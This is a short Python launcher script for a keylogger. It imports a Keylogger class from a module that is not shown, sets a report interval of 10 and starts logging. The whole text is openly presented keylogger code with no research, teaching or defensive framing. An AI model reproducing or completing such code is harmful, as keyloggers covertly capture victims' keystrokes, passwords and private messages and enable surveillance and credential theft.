from Keylogger import Keylogger

SEND_REPORT_EVERY = 10

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.create_filename()
    keylogger.start()
